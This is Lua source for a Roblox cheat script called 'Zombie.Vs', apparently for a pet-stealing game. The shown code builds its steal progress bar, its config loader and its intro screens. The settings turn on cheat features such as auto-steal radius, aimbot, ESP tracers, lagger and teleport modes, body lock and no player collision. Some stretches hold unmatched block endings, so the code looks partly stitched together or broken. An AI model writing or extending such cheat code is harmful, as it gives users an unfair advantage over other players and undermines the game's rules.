local infoBar = Instance.new("Frame", ibGui); infoBar.Name = "StealBarRoot"; infoBar.AnchorPoint = Vector2.new(0.5,1); infoBar.Size = UDim2.new(0,315,0,53); infoBar.Position = UDim2.new(0.5,0,1,-100); infoBar.BackgroundColor3 = WAVE_BAR.bg; infoBar.BorderSizePixel = 0; infoBar.Active = true; infoBar.Visible = true; infoBar.ZIndex = 50; corner(infoBar,10)
local sp = S.stealBarPos
if type(sp)=="table" and tonumber(sp.xs) and tonumber(sp.ys) then infoBar.Position = UDim2.new(tonumber(sp.xs),tonumber(sp.xo) or 0,tonumber(sp.ys),tonumber(sp.yo) or 0) end
local infoBarStroke = stroke(infoBar,WAVE_BAR.border,1.5,0)
local pbScale = Instance.new("UIScale",infoBar); pbScale.Name = "PBScale"; _G.__VersincProgressBarScaleObj = pbScale
if _G._VersincApplyProgressBarScale then _G._VersincApplyProgressBarScale(S.progressBarScale or 100) else pbScale.Scale = 0.7*(tonumber(S.progressBarScale) or 100)/100 end
local function waveLabel(name,pos,size,text,alignment)
    local label = Instance.new("TextLabel",infoBar); label.Name = name; label.Position = pos; label.Size = size; label.BackgroundTransparency = 1; label.Text = text; label.TextColor3 = WAVE_BAR.ink; label.TextSize = 10; label.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json",Enum.FontWeight.Bold,Enum.FontStyle.Normal); label.TextXAlignment = alignment or Enum.TextXAlignment.Center; label.ZIndex = 56; return label
end
local stealLabel = waveLabel("StealLabel",UDim2.new(0,0,0,-2),UDim2.new(1,0,0,24),"Zombie.Vs"); stealLabel.TextSize = 13
local pingLabel = waveLabel("PingLabel",UDim2.new(0,8,1,-20),UDim2.new(0,80,0,18),"PING: --",Enum.TextXAlignment.Left)
local fpsLabel = waveLabel("FpsLabel",UDim2.new(1,-78,1,-20),UDim2.new(0,70,0,18),"FPS: --",Enum.TextXAlignment.Right)
progressRadLbl = waveLabel("RadiusLabel",UDim2.new(0.5,-50,1,-20),UDim2.new(0,100,0,18),"Radius: "..tostring(Steal.StealRadius))
-- Mantém a referência esperada pelo código de progresso, sem adicionar texto ao desenho Wave.
progressPct = waveLabel("PctText",UDim2.new(),UDim2.new(),"0%"); progressPct.Visible = false
progressPct:GetPropertyChangedSignal("Text"):Connect(function()
    local percent = tonumber(progressPct.Text:match("(%d+)%%")) or 0
    stealLabel.Text = percent >= 100 and "STOLEN!" or (percent > 0 and "STEALING..." or "Zombie.Vs")
    stealLabel.TextColor3 = S.themeColor or WAVE_BAR.ink
end)
local pTrack = Instance.new("Frame",infoBar); pTrack.Name = "ProgressTrack"; pTrack.BackgroundColor3 = WAVE_BAR.track; pTrack.BorderSizePixel = 0; pTrack.Position = UDim2.new(0,12,0.5,-4); pTrack.Size = UDim2.new(1,-24,0,8); pTrack.ClipsDescendants = true; pTrack.ZIndex = 52; corner(pTrack,4)
progressFill = Instance.new("Frame",pTrack); progressFill.Name = "Fill"; progressFill.BackgroundColor3 = WAVE_BAR.ink; progressFill.Size = UDim2.new(0,0,1,0); progressFill.BorderSizePixel = 0; progressFill.ZIndex = 53; corner(progressFill,4)
local function applyStealFillColor(col)
    progressFill.BackgroundColor3 = getFillColor()
    -- Preserva a opção White Bar existente sem voltar ao desenho antigo.
    local whiteOn = S.whiteBarEnabled == true
    local chosen = S.themeColor or WAVE_BAR.ink
    infoBar.BackgroundColor3 = whiteOn and Color3.fromRGB(255,255,255) or Color3.new(chosen.R*0.07,chosen.G*0.07,chosen.B*0.07)
    infoBarStroke.Color = chosen
    for _,d in ipairs(infoBar:GetDescendants()) do
        if d:IsA("TextLabel") then d.TextColor3 = chosen end
    end
end
applyStealFillColor(getFillColor()); _G.__VersincApplyStealFillColor = applyStealFillColor
local function _pingMs()
    local ms = 0
    pcall(function() local item = game:GetService("Stats").Network.ServerStatsItem:FindFirstChild("Data Ping"); if item then ms = tonumber(tostring(item:GetValue()):match("[%d%.]+")) or 0 end end)
    if ms <= 0 then pcall(function() ms = LP:GetNetworkPing()*1000 end) end
    return math.max(0,math.floor(ms+0.5))
end
task.defer(function()
    local cam = workspace.CurrentCamera
    if cam then
        local vp = cam.ViewportSize; local p = infoBar.AbsolutePosition; local size = infoBar.AbsoluteSize
        if p.X < 0 or p.Y < 0 or p.X+size.X > vp.X or p.Y+size.Y > vp.Y then
            infoBar.Position = UDim2.new(0.5,0,1,-100); S.stealBarPos = nil
        end
    end
end)
local barFrames, barLast, barFPS = 0,tick(),0
local barFpsConnection
barFpsConnection = RunService.RenderStepped:Connect(function()
    if not infoBar.Parent then if barFpsConnection then barFpsConnection:Disconnect() end; return end
    barFrames = barFrames+1; local now = tick()
    if now-barLast >= 0.5 then barFPS = math.floor(barFrames/(now-barLast)+0.5); barFrames=0; barLast=now end
end)

do
    local dn, ds, sp, moved = false, nil, nil, false
    local function persistStealBar()
        local p = infoBar.Position
        S.stealBarPos = { xs = p.X.Scale, xo = p.X.Offset, ys = p.Y.Scale, yo = p.Y.Offset }
        pcall(function() if F.saveConfig then F.saveConfig(true) end end)
    end
    infoBar.InputBegan:Connect(function(inp)
        if S.guiLocked == true then return end
        if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
            dn = true; moved = false; ds = inp.Position; sp = infoBar.Position
            inp.Changed:Connect(function()
                if inp.UserInputState == Enum.UserInputState.End then
                    dn = false
                    if moved then persistStealBar() end
                end
            end)
        end
    end)
    UIS.InputChanged:Connect(function(inp)
        if dn and (inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch) then
            if S.guiLocked == true then dn = false; return end
            local d = inp.Position - ds
            moved = true
            infoBar.Position = UDim2.new(sp.X.Scale, sp.X.Offset + d.X, sp.Y.Scale, sp.Y.Offset + d.Y)
        end
    end)
end

    end
end)
end
end function F.loadConfigKeys() local raw = nil
if _isfile(CONFIG_FILE) then raw = _readfile(CONFIG_FILE) elseif _isfile(CONFIG_FILE_LEGACY) then raw = _readfile(CONFIG_FILE_LEGACY) end if not raw or raw == "" then return end local ok, cfg; do local __m = {pcall(function() return HS:JSONDecode(raw) end)}; ok = __m[1]; cfg = __m[2]; end if not ok or not cfg then return end _savedCfg=cfg if type(cfg.avatarChanger)=="table" then AvatarChanger.load(cfg.avatarChanger) end local function lk(e,d) if type(d)~="table" then return end;if d.kb and Enum.KeyCode[d.kb] then e.kb=Enum.KeyCode[d.kb] end;if d.gp and Enum.KeyCode[d.gp] then e.gp=Enum.KeyCode[d.gp] end end
lk(KB.DropBrainrot,cfg.dropBrainrotKey);lk(KB.AutoLeft,cfg.autoLeftKey);lk(KB.AutoRight,cfg.autoRightKey); lk(KB.AutoBat,cfg.autoBatKey);lk(KB.TPBat,cfg.tpBatKey);lk(KB.LaggerToggle,cfg.laggerToggleKey); lk(KB.TPFloor,cfg.tpFloorKey);lk(KB.InstaReset,cfg.instaResetKey);lk(KB.AntiTPBat,cfg.antiTpBatKey);lk(KB.BatV2,cfg.batV2Key);lk(KB.GuiHide,cfg.guiHideKey);lk(KB.SpeedToggle,cfg.speedToggleKey) if cfg.normalSpeed then NS=cfg.normalSpeed; S.NS=NS end if cfg.carrySpeed then CS=cfg.carrySpeed; S.CS=CS end if cfg.selectedStealMode == "Semi" or cfg.selectedStealMode == "Normal" or cfg.selectedStealMode == "V3" then MysteryGrab.setMode(cfg.selectedStealMode) end if type(cfg.aceStealRadii)=="table" then
AceStealRadii.Normal = tonumber(cfg.aceStealRadii.Normal) or AceStealRadii.Normal; AceStealRadii.Semi = tonumber(cfg.aceStealRadii.Semi) or AceStealRadii.Semi end if cfg.grabRadius and type(cfg.grabRadius)=="number" then autoStealRadius=cfg.grabRadius; Steal.StealRadius=cfg.grabRadius elseif selectedStealMode=="Semi" then autoStealRadius=AceStealRadii.Semi; Steal.StealRadius=autoStealRadius else autoStealRadius=AceStealRadii.Normal; Steal.StealRadius=autoStealRadius end if cfg.stealDuration and type(cfg.stealDuration)=="number" and cfg.stealDuration >= 0.1 then
Steal.StealDuration = cfg.stealDuration end if type(cfg.autoBatSpeed) == "number" and cfg.autoBatSpeed > 0 then S.AUTO_BAT_SPEED = math.clamp(cfg.autoBatSpeed, 1, 500) end if cfg.autoGrabStopEnabled ~= nil then autoGrabStopEnabled = cfg.autoGrabStopEnabled == true; Steal.AutoGrabStopEnabled = autoGrabStopEnabled end if cfg.autoGrabStopTime and type(cfg.autoGrabStopTime)=="number" and cfg.autoGrabStopTime > 0 then autoGrabStopTime = cfg.autoGrabStopTime; Steal.AutoGrabStopTime = cfg.autoGrabStopTime end if cfg.autoGrabDelayRadius and type(cfg.autoGrabDelayRadius)=="number" and cfg.autoGrabDelayRadius > 0 then autoGrabDelayRadius = cfg.autoGrabDelayRadius; Steal.AutoGrabDelayRadius = cfg.autoGrabDelayRadius end
Steal.StealRadius = tonumber(autoStealRadius) or Steal.StealRadius or 20 if cfg.ragdollStealEnabled ~= nil then S.ragdollStealEnabled = cfg.ragdollStealEnabled == true end if cfg.laggerSpeed and type(cfg.laggerSpeed)=="number" then S.LAGGER_SPEED=cfg.laggerSpeed end if cfg.laggerCarrySpeed and type(cfg.laggerCarrySpeed)=="number" then S.LAGGER_CARRY_SPEED=cfg.laggerCarrySpeed end if cfg.autoTPHeight and type(cfg.autoTPHeight)=="number" then S.autoTPHeight=cfg.autoTPHeight end if cfg.autoSwing~=nil then S.autoSwingEnabled=cfg.autoSwing==true end if cfg.informationE01 ~= nil then S.informationE01Enabled = cfg.informationE01 == true else S.informationE01Enabled = true end if cfg.guiScale and type(cfg.guiScale)=="number" then task.defer(function()
if _G._VersincApplyGuiScale then _G._VersincApplyGuiScale(cfg.guiScale) end end) end S.autoSaveEnabled = true if cfg.introEnabled ~= nil then S.introEnabled = cfg.introEnabled == true end if cfg.aimbotSpeed and type(cfg.aimbotSpeed) == "number" and cfg.aimbotSpeed > 0 then AIMBOT_SPEED = cfg.aimbotSpeed end if type(cfg.tpBatMode)=="number" and cfg.tpBatMode>=1 and cfg.tpBatMode<=2 then tpBatMode = math.floor(cfg.tpBatMode) else tpBatMode = 1 end if type(cfg.tpBatSpeed)=="number" then S.tpBatSpeed = math.clamp(math.floor(cfg.tpBatSpeed), 10, 80) end if type(cfg.outfitSel)=="number" then S.outfitSel = math.floor(cfg.outfitSel) end S.outfitOn = cfg.outfitOn == true pcall(function() if UI.applyOutfit then task.delay(1, function() if S.outfitOn then UI.applyOutfit() end end) end end) if cfg.antiTpBatMode == "v1" or cfg.antiTpBatMode == "v2" or cfg.antiTpBatMode == "v3" or cfg.antiTpBatMode == "v4" then AntiTPBat.mode = cfg.antiTpBatMode else AntiTPBat.mode = "v1" end if KB.TPBat.kb then TP_BAT_KEY = KB.TPBat.kb end if KB.TPBat.gp then TP_BAT_CONTROLLER = KB.TPBat.gp end
if cfg.tpBatLegacyKey and Enum.KeyCode[cfg.tpBatLegacyKey] and not (cfg.tpBatKey and type(cfg.tpBatKey)=="table") then TP_BAT_KEY = Enum.KeyCode[cfg.tpBatLegacyKey]; KB.TPBat.kb = TP_BAT_KEY end if type(cfg.mobileButtonPositions) == "table" then _G.VersincMobileButtonPositions = cfg.mobileButtonPositions else _G.VersincMobileButtonPositions = _G.VersincMobileButtonPositions or {} end if cfg.mobileButtonScale and type(cfg.mobileButtonScale) == "number" then S.mobileButtonScale = math.clamp(cfg.mobileButtonScale, 0.30, 2.00) else S.mobileButtonScale = 0.70 end if cfg.hideMobileButtons ~= nil then S.hideMobileButtons = cfg.hideMobileButtons == true end if cfg.allLockButtons ~= nil then
S.allLockButtons = cfg.allLockButtons == true pcall(function() if VS and VS.setAllLockVisual then VS.setAllLockVisual(S.allLockButtons) end end) end if cfg.lockMobileButtons ~= nil then S.lockMobileButtons = cfg.lockMobileButtons == true end if cfg.moveButtons ~= nil then S.moveButtons = cfg.moveButtons == true end if cfg.circleButtons ~= nil then S.circleButtons = cfg.circleButtons == true end if type(cfg.stealBarPos) == "table" then S.stealBarPos = cfg.stealBarPos end if cfg.whiteBarEnabled ~= nil then S.whiteBarEnabled = cfg.whiteBarEnabled == true end if cfg.progressBarScale ~= nil then S.progressBarScale = math.clamp(tonumber(cfg.progressBarScale) or 100, 50, 200)
pcall(function() if _G._VersincApplyProgressBarScale then _G._VersincApplyProgressBarScale(S.progressBarScale) end end) end end function F.loadConfigState() local cfg=_savedCfg;if not cfg then return end if cfg.bgId ~= nil then S.currentBgId = cfg.bgId or "" task.defer(function() if _G._VersincApplyBackground then _G._VersincApplyBackground(S.currentBgId, true) end end) end if type(cfg.bgIntensity)=="number" then S.bgIntensity = cfg.bgIntensity end if cfg.themeName and type(cfg.themeName)=="string" then S.currentThemeName = cfg.themeName task.defer(function()
if _G._VersincApplyTheme then _G._VersincApplyTheme(cfg.themeName) end end) end if UI.normalBox then UI.normalBox.Text=tostring(NS) end if UI.carryBox then UI.carryBox.Text=tostring(CS) end if UI.autoBatSpeedBox then UI.autoBatSpeedBox.Text=tostring(S.AUTO_BAT_SPEED or 58) end if UI.radInput then UI.radInput.Text=tostring(autoStealRadius or Steal.StealRadius or 63) end if UI.stealDurInput then UI.stealDurInput.Text=tostring(Steal.StealDuration or 1.3) end if UI.stopTimeInput then UI.stopTimeInput.Text=tostring(autoGrabStopTime or Steal.AutoGrabStopTime or 0.975) end if UI.delayRadInput then UI.delayRadInput.Text=tostring(autoGrabDelayRadius or Steal.AutoGrabDelayRadius or 8) end if progressRadLbl then progressRadLbl.Text = string.format("Radius: %.0f", autoStealRadius or Steal.StealRadius or 63) end if UI.laggerBox then UI.laggerBox.Text=tostring(S.LAGGER_SPEED) end if UI.laggerCarryBox then UI.laggerCarryBox.Text=tostring(S.LAGGER_CARRY_SPEED) end if UI.autoTPHeightBox then UI.autoTPHeightBox.Text=tostring(S.autoTPHeight) end if VS.setAutoGrabStopVisual then pcall(function() VS.setAutoGrabStopVisual(autoGrabStopEnabled == true) end) end if VS.setWhiteBarVisual then pcall(function() VS.setWhiteBarVisual(S.whiteBarEnabled == true) end) end if VS.setRagdollStealVisual then pcall(function() VS.setRagdollStealVisual(S.ragdollStealEnabled == true) end) end pcall(function() if _G.__VersincApplyStealFillColor then _G.__VersincApplyStealFillColor(getFillColor()) end end) if VS.setInformationE01Visual then pcall(function() VS.setInformationE01Visual(S.informationE01Enabled ~= false) end) end
 end if cfg.autoRight then task.defer(function() task.wait(0.45) if F.queueAutoRightStart then F.queueAutoRightStart() end if S.autoRightSetVisual then S.autoRightSetVisual(true) end end) end if cfg.autoStealEnabled then if VS.setInstaGrab then VS.setInstaGrab(true) end pcall(startAutoSteal) end if cfg.medusaCounter then S.medusaCounterEnabled=true;if VS.setMedusaVisual then VS.setMedusaVisual(true) end end if cfg.medusaReset or cfg.autoResetOnMedEnabled then
S.medusaResetEnabled=true; S.autoResetOnMedEnabled=true if VS.setMedusaResetVisual then VS.setMedusaResetVisual(true) end end if S.medusaCounterEnabled or S.medusaResetEnabled then F.setupMedusa(LP.Character) end if cfg.batCounter then S.batCounterEnabled=true;if VS.setBatCounterVisual then VS.setBatCounterVisual(true) end;S.startBatCounter() end if cfg.laggerMode then S.laggerToggled=true;S.speedMode=false;S.laggerPhase=cfg.laggerCarryMode and 2 or 1;F.refreshSpeedModeLabel() elseif cfg.carryMode then S.speedMode=false;F.toggleCarryMode() end if cfg.autoCarrySpeedEnabled then
S.autoCarrySpeedEnabled = true if S.setAutoCarrySpeedVisual then S.setAutoCarrySpeedVisual(true) end end if cfg.noPlayerCollisionEnabled then F.enableNoPlayerCollision() if VS.setNoPlayerCollisionVisual then VS.setNoPlayerCollisionVisual(true) end end if cfg.safeModeEnabled then S.safeModeEnabled = true if VS.setSafeModeVisual then VS.setSafeModeVisual(true) end end if cfg.autoTPEnabled then S.autoTPEnabled=true;if VS.setAutoTPVisual then VS.setAutoTPVisual(true) end;F.startAutoTP() end if VS.setAutoSwingVisual then VS.setAutoSwingVisual(S.autoSwingEnabled) end
if cfg.autoBatV2 then task.defer(function() task.wait(0.5); F.startBatV2() end) end if cfg.autoBat then S.autoBatEnabled=true;if S.autoBatSetVisual then S.autoBatSetVisual(true) end;F.queueAutoBatStart() end if cfg.unwalkEnabled then S.unwalkEnabled=true;if VS.setUnwalkVisual then VS.setUnwalkVisual(true) end; end if cfg.keyboardOverlay then S.keyboardOverlayEnabled = true if VS.setKeyboardOverlayVisual then VS.setKeyboardOverlayVisual(true) end pcall(function() F.startKeyboardOverlay() end) end S.customToolSkinBat=cfg.customToolSkinBat or S.customToolSkinBat;S.customToolSkinMedusa=cfg.customToolSkinMedusa or S.customToolSkinMedusa;if UI.refreshSwordSkin then UI.refreshSwordSkin() end;if UI.refreshMedusaSkin then UI.refreshMedusaSkin() end;if cfg.customToolsEnabled then ToolEditor.setEnabled(true);if VS.setCustomToolsVisual then VS.setCustomToolsVisual(true) end end;if cfg.rainbowToolsEnabled then ToolEditor.setRainbow(true);if VS.setRainbowToolsVisual then VS.setRainbowToolsVisual(true) end end;if cfg.rainbowJoystickEnabled then if F.setRainbowJoystick then F.setRainbowJoystick(true) end;if VS.setRainbowJoystickVisual then VS.setRainbowJoystickVisual(true) end end;if cfg.transparentToolsEnabled then ToolEditor.setTransparency(true);if VS.setTransparentToolsVisual then VS.setTransparentToolsVisual(true) end end;if cfg.customSoundsEnabled then ToolEditor.setSounds(true);if VS.setCustomSoundsVisual then VS.setCustomSoundsVisual(true) end end if cfg.antiLag then F.enableAntiLag();if VS.setAntiLagVisual then VS.setAntiLagVisual(true) end end
if cfg.stretchRez then enableStretchRez();if VS.setStretchRezVisual then VS.setStretchRezVisual(true) end end task.defer(function() task.wait(0.8); AvatarChanger.applyAll() end) if cfg.showTracerEnabled then pcall(function() if F.clearTracers then F.clearTracers() end end) if VS.setShowTracerVisual then VS.setShowTracerVisual(true) end end if cfg.ragdollCountdownEnabled then F.setRagdollCountdown(true) if VS.setRagdollCdVisual then VS.setRagdollCdVisual(true) end end S.guiLocked = cfg.guiLocked and true or false if VS.setLockGuiVisual then VS.setLockGuiVisual(S.guiLocked) end if type(cfg.hubPos) == "table" then S.hubPos = cfg.hubPos end
if type(cfg.miniPos) == "table" then S.miniPos = cfg.miniPos end if (S.hubPos or S.miniPos) and _G._VersincSetHubPos then pcall(function() _G._VersincSetHubPos(nil, S.miniPos) end) task.defer(function() pcall(function() _G._VersincSetHubPos(nil, S.miniPos) end) end) end if cfg.lockMobileButtons then S.lockMobileButtons = true if VS.setLockMobileButtonsVisual then VS.setLockMobileButtonsVisual(true) end end if cfg.hideMobileButtons then S.hideMobileButtons = true if VS.setHideMobileVisual then VS.setHideMobileVisual(true) end end if cfg.circleButtons ~= nil then S.circleButtons = cfg.circleButtons == true if VS.setCircleButtonsVisual then VS.setCircleButtonsVisual(S.circleButtons) end end if cfg.mobileButtonScale then
S.mobileButtonScale = math.clamp(tonumber(cfg.mobileButtonScale) or 0.80, 0.30, 2.00) end if type(cfg.mobileButtonPositions) == "table" then _G.VersincMobileButtonPositions = cfg.mobileButtonPositions else _G.VersincMobileButtonPositions = _G.VersincMobileButtonPositions or {} end if cfg.autoResetOnMedEnabled then F.setAutoResetOnMed(true) if VS.setAutoResetOnMedVisual then VS.setAutoResetOnMedVisual(true) end end if cfg.lineESP or cfg.speedESP then if K7 then K7.lineESPEnabled = true; K7.speedESPEnabled = true end if VS.setLineESPVisual then VS.setLineESPVisual(true) end pcall(function() if K7 and K7.refreshESP then K7.refreshESP() end end) end if cfg.fovEnabled and K7 then
K7.fovEnabled = true if cfg.fovValue then K7.fovValue = tonumber(cfg.fovValue) or K7.fovValue end if VS.setFOVVisual then VS.setFOVVisual(true) end pcall(function() if K7.applyFOV then K7.applyFOV() end end) end if cfg.korbloxSide and type(cfg.korbloxSide)=="number" then korbloxSide = math.clamp(math.floor(cfg.korbloxSide), 1, 3) if K7 then K7.korbloxSide = korbloxSide end end if cfg.headless and K7 then K7.headlessEnabled = true if VS.setHeadlessVisual then VS.setHeadlessVisual(true) end  end if cfg.korblox and K7 then K7.korbloxEnabled = true if VS.setKorbloxVisual then VS.setKorbloxVisual(true) end  end if cfg.bodyLock and K7 then K7.bodyLockEnabled = true if cfg.bodyLockRadius then K7.bodyLockRadius = tonumber(cfg.bodyLockRadius) or K7.bodyLockRadius end
if VS.setBodyLockVisual then VS.setBodyLockVisual(true) end pcall(function() if K7.startBodyLock then K7.startBodyLock() end end) end if K7 and cfg.animPack and type(cfg.animPack) == "string" then K7.animPackName = cfg.animPack if K7.ANIM_PACK_LIST then for i, n in ipairs(K7.ANIM_PACK_LIST) do if n == cfg.animPack then K7.animPackIndex = i break end end end if UI.animPackLbl then pcall(function() UI.animPackLbl.Text = K7.animPackName end) end end if cfg.animPackEnabled and K7 then K7.animPackEnabled = true if VS.setAnimPackVisual then VS.setAnimPackVisual(true) end  task.wait(1.2) pcall(function() if K7.animPackEnabled and K7.applyAnimPack then K7.applyAnimPack(K7.animPackName) end end) end) end if K7 and type(cfg.animPackIndex) == "number" then K7.animPackIndex = math.floor(cfg.animPackIndex) end if K7 and cfg.accessoryPack and type(cfg.accessoryPack) == "string" then K7.accessoryPackName = cfg.accessoryPack if K7.ACCESSORY_PACK_LIST then for i, n in ipairs(K7.ACCESSORY_PACK_LIST) do if n == cfg.accessoryPack then K7.accessoryPackIndex = i break end end end if UI.accessoryPackLbl then pcall(function() UI.accessoryPackLbl.Text = K7.accessoryPackName end) end end if K7 and type(cfg.accessoryPackIndex) == "number" then K7.accessoryPackIndex = math.floor(cfg.accessoryPackIndex) end if cfg.accessoryPackEnabled and K7 then K7.accessoryPackEnabled = true if VS.setAccessoryPackVisual then VS.setAccessoryPackVisual(true) end  task.wait(1.2) pcall(function() if K7.accessoryPackEnabled and K7.applyAccessoryPack then K7.applyAccessoryPack(K7.accessoryPackName) end end) end) end if K7 and type(cfg.skyThemeIndex) == "number" then K7.skyThemeIndex = math.floor(cfg.skyThemeIndex) end if cfg.skyTheme and K7 and K7.applySkyTheme then pcall(function() K7.applySkyTheme(cfg.skyTheme) end) end end) end S.introEnabled = S.introEnabled ~= false function F.playZombieVSIntro() if S.introEnabled == false then return end local pg = LP:FindFirstChild("PlayerGui") or LP:WaitForChild("PlayerGui", 5) if not pg then return end
local old = pg:FindFirstChild("ZombieVSIntro") if old then old:Destroy() end local sg = Instance.new("ScreenGui"); sg.Name = "ZombieVSIntro"; sg.IgnoreGuiInset = true; sg.DisplayOrder = 9999; sg.ResetOnSpawn = false; sg.Parent = pg; local skipped = false local function skipIntro() if skipped then return end skipped = true; S.introEnabled = false pcall(function() if sg then sg:Destroy() end end) end
local bg = Instance.new("Frame", sg); bg.Size = UDim2.new(1, 0, 1, 0); bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0); bg.BorderSizePixel = 0; local skipBtn = Instance.new("TextButton", bg); skipBtn.Name = "SkipIntro"; skipBtn.AnchorPoint = Vector2.new(1, 0); skipBtn.Position = UDim2.new(1, -16, 0, 16); skipBtn.Size = UDim2.new(0, 88, 0, 32); skipBtn.BackgroundColor3 = Color3.fromRGB(28, 28, 32); skipBtn.BackgroundTransparency = 0.15; skipBtn.BorderSizePixel = 0; skipBtn.Text = "SKIP"; skipBtn.TextColor3 = Color3.fromRGB(245, 245, 247); skipBtn.Font = Enum.Font.GothamBold; skipBtn.TextSize = 13; skipBtn.ZIndex = 20; Instance.new("UICorner", skipBtn).CornerRadius = UDim.new(0, 8); local skStroke = Instance.new("UIStroke", skipBtn); skStroke.Color = Color3.fromRGB(180, 180, 190); skStroke.Thickness = 1; skStroke.Transparency = 0.35; skipBtn.Activated:Connect(skipIntro); skipBtn.MouseButton1Click:Connect(skipIntro); local title = Instance.new("TextLabel", bg); title.AnchorPoint = Vector2.new(0.5, 0.5); title.Position = UDim2.new(0.5, 0, 0.48, 0); title.Size = UDim2.new(0, 420, 0, 40); title.BackgroundTransparency = 1; title.Text = "ZOMBIE.VS"; title.TextColor3 = Color3.fromRGB(255, 255, 255); title.Font = Enum.Font.GothamBlack; title.TextSize = 36; title.TextTransparency = 1; local sub = Instance.new("TextLabel", bg); sub.AnchorPoint = Vector2.new(0.5, 0); sub.Position = UDim2.new(0.5, 0, 0.48, 28); sub.Size = UDim2.new(0, 420, 0, 22); sub.BackgroundTransparency = 1; sub.Text = "welcome"; sub.TextColor3 = Color3.fromRGB(180, 190, 210); sub.Font = Enum.Font.GothamBold; sub.TextSize = 14; sub.TextTransparency = 1; local line = Instance.new("Frame", bg); line.AnchorPoint = Vector2.new(0.5, 0); line.Position = UDim2.new(0.5, 0, 0.48, 54); line.Size = UDim2.new(0, 0, 0, 2); line.BackgroundColor3 = Color3.fromRGB(220, 220, 230); line.BorderSizePixel = 0; TS:Create(title, TweenInfo.new(0.7, Enum.EasingStyle.Quad), { TextTransparency = 0 }):Play(); TS:Create(sub, TweenInfo.new(0.85, Enum.EasingStyle.Quad), { TextTransparency = 0.15 }):Play(); TS:Create(line, TweenInfo.new(0.9, Enum.EasingStyle.Quad), { Size = UDim2.new(0, 140, 0, 2) }):Play()
task.delay(2.15, function() if skipped or not sg or not sg.Parent then return end TS:Create(title, TweenInfo.new(0.55), { TextTransparency = 1 }):Play(); TS:Create(sub, TweenInfo.new(0.55), { TextTransparency = 1 }):Play(); TS:Create(line, TweenInfo.new(0.55), { BackgroundTransparency = 1 }):Play(); TS:Create(bg, TweenInfo.new(0.65), { BackgroundTransparency = 1 }):Play() task.delay(0.7, function() if not skipped and sg then sg:Destroy() end end) end) end

-- Information E01: mostra o tempo para entrar quando um pet e pego na mao.
do
    _genv.__ZombieVSE01Generation = (_genv.__ZombieVSE01Generation or 0) + 1
    local runGeneration = _genv.__ZombieVSE01Generation
    local introGeneration = 0
    local wasHoldingBrainrot = false
    local activeIntroGui = nil

    local function isHoldingBrainrot()
        local ok, carrying; do local __m = {pcall(function()
            if F.safeModeHoldingBrainrot then return F.safeModeHoldingBrainrot() end
            return F.isCarryingBrainrot and F.isCarryingBrainrot(LP.Character) or false
        end)}; ok = __m[1]; carrying = __m[2]; end
        return ok and carrying == true
    end

    local function playBrainrotIntro(myGeneration)
        if activeIntroGui then pcall(function() activeIntroGui:Destroy() end) end
        local playerGui = LP and (LP:FindFirstChildOfClass("PlayerGui") or LP:WaitForChild("PlayerGui", 5))
        if not playerGui or myGeneration ~= introGeneration or not isHoldingBrainrot() or S.informationE01Enabled == false then return end

        local introGui = Instance.new("ScreenGui")
        introGui.Name = "BrainrotEnterIntro"
        introGui.ResetOnSpawn = false
        introGui.IgnoreGuiInset = true
        introGui.DisplayOrder = 1000000
        introGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        introGui.Parent = playerGui
        activeIntroGui = introGui

        local strip = Instance.new("Frame")
        strip.Name = "EnterStrip"
        strip.AnchorPoint = Vector2.new(0.5, 0.5)
        strip.Position = UDim2.new(0.5, 0, -0.18, 0)
        strip.BackgroundColor3 = Color3.fromRGB(15, 17, 16)
        strip.BackgroundTransparency = 0
        strip.BorderSizePixel = 0
        strip.ClipsDescendants = false
        strip.ZIndex = 2
        strip.Parent = introGui
        Instance.new("UICorner", strip).CornerRadius = UDim.new(1, 0)

        local completeBorder = Instance.new("UIStroke", strip)
        completeBorder.Name = "CompleteLoadingBorder"
        completeBorder.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        completeBorder.Color = Color3.fromRGB(255, 255, 255)
        completeBorder.Thickness = 3
        completeBorder.Transparency = 1
        completeBorder.ZIndex = 6

        local scale = Instance.new("UIScale", strip)
        scale.Scale = 0.9
        local stripHeight, lineThickness, inset = 46, 3, 3

        local function fitStrip()
            local camera = workspace.CurrentCamera
            if not camera or not strip.Parent then return end
            strip.Size = UDim2.fromOffset(math.max(180, math.floor(camera.ViewportSize.X * 0.33)), stripHeight)
        end
        fitStrip()

        local cameraConn
        local function bindCamera(camera)
            if cameraConn then cameraConn:Disconnect(); cameraConn = nil end
            if camera then cameraConn = camera:GetPropertyChangedSignal("ViewportSize"):Connect(fitStrip) end
        end
        bindCamera(workspace.CurrentCamera)

        local label = Instance.new("TextLabel")
        label.Name = "EnterLabel"
        label.Size = UDim2.new(1, -32, 1, -16)
        label.Position = UDim2.fromOffset(16, 8)
        label.BackgroundTransparency = 1
        label.Text = "DON'T ENTER"
        label.TextColor3 = Color3.fromRGB(255, 255, 255)
        label.Font = Enum.Font.GothamBlack
        label.TextScaled = true
        label.TextWrapped = true
        label.ZIndex = 5
        label.Parent = strip
        local textLimit = Instance.new("UITextSizeConstraint", label)
        textLimit.MinTextSize = 10
        textLimit.MaxTextSize = 16

        local function stillValid()
            return myGeneration == introGeneration and introGui.Parent ~= nil and isHoldingBrainrot() and S.informationE01Enabled ~= false and _genv.__ZombieVSE01Generation == runGeneration
        end
        local function abortIfReleased()
            if stillValid() then return false end
            if cameraConn then cameraConn:Disconnect(); cameraConn = nil end
            if introGui.Parent then introGui:Destroy() end
            if activeIntroGui == introGui then activeIntroGui = nil end
            return true
        end

        local arrival = TS:Create(strip, TweenInfo.new(0.52, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = UDim2.fromScale(0.5, 0.12)})
        TS:Create(scale, TweenInfo.new(0.52, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1}):Play()
        arrival:Play()
        arrival.Completed:Wait()
        if abortIfReleased() then return end

        local revealTime = 1.9
        local viewCam = workspace.CurrentCamera
        local stripW = math.floor(strip.AbsoluteSize.X)
        if stripW < 8 then stripW = viewCam and math.max(180, math.floor(viewCam.ViewportSize.X * 0.33)) or 240 end
        local pathW = math.max(2, stripW - inset * 2)
        local pathH = math.max(2, stripHeight - inset * 2)
        local radius = pathH / 2
        local straight = math.max(0, pathW - radius * 2)
